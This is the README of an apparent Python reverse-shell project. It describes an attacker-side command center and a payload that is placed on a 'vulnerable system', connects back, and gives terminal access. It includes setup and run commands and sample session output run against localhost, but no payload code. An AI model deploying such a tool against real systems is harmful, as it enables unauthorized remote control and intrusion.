# Reverse Shell
*Feel the complete power of the terminal with limited access*. Simplifies command execution on a system where you have access to a raw shell or when results of commands are not visible.
It gives the exact terminal feel.
### When to use it?
If you have access to a raw terminal and want a complete terminal like access to the system then this is your tool. 
+ You have found out some way to execute commands on a vulnerable system like execute an *ls* command but are not able to see the results of the command. 
+ You want complete terminal like access to the vulnerable system
### Modules 
1. **Reverse shell command center** - This script needs to be run on the attacker's system. The vulnerable system initiates a reverse tcp connection with this command center. This is responsible for providing the terminal feel. 
It takes commands from the attacker and then sends it to the payload running on the vulnerable system. Collects and shows the results of the commands from the payload script.
2. **Payload** - This script needs to be run of the vulnerable system. Once this is run, it initiates a tcp connection with the attackers system. Once the connection is established the attacker gets the complete terminal access to this vulnerable system. It collects instructions from the command center, executes them and send the results back to the command center.
### How to get this up and running?
First clone this repo. cd into the directory. Transfer the payload to the vulnerable system.
Setup on both the systems:
```sh
virtualenv ENV_NAME -p python3
source ENV_NAME/bin/activate
pip3 install requirements.txt
```
Starting the command center:
```sh
python3 command-control.py
```
Now you will see a screen something like this:
```console
____ ____ _  _ ____ ____ ____ ____    ____ _  _ ____ _    _    
|__/ |___ |  | |___ |__/ [__  |___    [__  |__| |___ |    |    
|  \ |___  \/  |___ |  \ ___] |___    ___] |  | |___ |___ |___ 
                                                               
____ ____ _  _ _  _ ____ _  _ ___     ____ ____ _  _ ___ ____ ____ _    
|    |  | |\/| |\/| |__| |\ | |  \    |    |  | |\ |  |  |__/ |  | |    
|___ |__| |  | |  | |  | | \| |__/    |___ |__| | \|  |  |  \ |__| |___ 
                                                                        


Simplifies command execution on a system with reverse shell access

Listening on port 8006 for connections...

```

Starting the payload:
```sh
python3 payload.py
```
Now the payload will establish connection with the command center and you will see a screen something like this:
```console
____ ____ _  _ ____ ____ ____ ____    ____ _  _ ____ _    _    
|__/ |___ |  | |___ |__/ [__  |___    [__  |__| |___ |    |    
|  \ |___  \/  |___ |  \ ___] |___    ___] |  | |___ |___ |___ 
                                                               
____ ____ _  _ _  _ ____ _  _ ___     ____ ____ _  _ ___ ____ ____ _    
|    |  | |\/| |\/| |__| |\ | |  \    |    |  | |\ |  |  |__/ |  | |    
|___ |__| |  | |  | |  | | \| |__/    |___ |__| | \|  |  |  \ |__| |___ 
                                                                        


Simplifies command execution on a system with reverse shell access

Listening on port 8006 for connections...
Received connection from  127.0.0.1  port: 39432
Client is: <socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8006), raddr=('127.0.0.1', 39432)>
 ~username@hostname:working_directory$ 


```
Now you can start entering the commands and outputs will be shown just like the normal terminal
```console
____ ____ _  _ ____ ____ ____ ____    ____ _  _ ____ _    _    
|__/ |___ |  | |___ |__/ [__  |___    [__  |__| |___ |    |    
|  \ |___  \/  |___ |  \ ___] |___    ___] |  | |___ |___ |___ 
                                                               
____ ____ _  _ _  _ ____ _  _ ___     ____ ____ _  _ ___ ____ ____ _    
|    |  | |\/| |\/| |__| |\ | |  \    |    |  | |\ |  |  |__/ |  | |    
|___ |__| |  | |  | |  | | \| |__/    |___ |__| | \|  |  |  \ |__| |___ 
                                                                        


Simplifies command execution on a system with reverse shell access

Listening on port 8001 for connections...
Received connection from  127.0.0.1  port: 39432
Client is: <socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8006), raddr=('127.0.0.1', 39432)>
 ~asdf@hostname:python/revShell$ ls
command-control.py
payload.py
requirements.txt

 ~asdf@hostname:python/revShell$ cat requirements.txt
pkg-resources==0.0.0
pyfiglet==0.8.post1

 ~asdf@hostname:python/revShell$ cd ..
Changed Directory
 ~asdf@hostname:python$ 
```
